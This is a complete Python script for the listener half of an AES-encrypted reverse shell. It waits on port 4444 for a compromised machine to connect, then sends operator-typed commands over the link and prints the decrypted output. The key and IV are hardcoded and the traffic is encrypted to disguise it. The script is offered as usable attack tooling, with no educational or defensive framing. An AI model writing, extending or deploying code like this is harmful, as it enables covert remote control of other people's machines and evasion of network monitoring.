import socket
from Crypto.Cipher import AES

AES_KEY = b"\x42\x37\x91\xAF\xD3\x99\x58\x1C\x70\xAA\xE2\x4B\xC9\x31\xDD\x60"
AES_IV  = b"\x11\x22\x33\x44\x55\x66\x77\x88\x99\xAA\xBB\xCC\xDD\xEE\xFF\x00"

def pad(data):
    pad_len = 16 - (len(data) % 16)
    return data + bytes([pad_len] * pad_len)

def unpad(data):
    return data[:-data[-1]] if data else data

def decrypt_msg(cipher, data):
    return unpad(cipher.decrypt(data))

def encrypt_msg(cipher, data):
    return cipher.encrypt(pad(data))

def start_listener(host="0.0.0.0", port=4444):
    print("[DEBUG] Starting listener...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("[DEBUG] Socket created")
    s.bind((host, port))
    print("[DEBUG] Socket bound")
    s.listen(1)
    print(f"[+] waiting connection in {host}:{port} ...")

    conn, addr = s.accept()
    print(f"[+] connected from  {addr[0]}")

    aes = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)

    try:
        while True:
            cmd = input("Shell> ").encode()
            if not cmd: continue

            cipher_send = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
            conn.sendall(encrypt_msg(cipher_send, cmd))

            cipher_recv = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
            output = b""
            while True:
                data = conn.recv(512)
                if b"<EOF>" in data:
                    output += data.replace(b"<EOF>", b"")
                    break
                output += data

            print(decrypt_msg(cipher_recv, output).decode(errors="ignore"))
    except KeyboardInterrupt:
        print("\n[!] closing connection.")
        conn.close()

if __name__ == "__main__":
    start_listener()
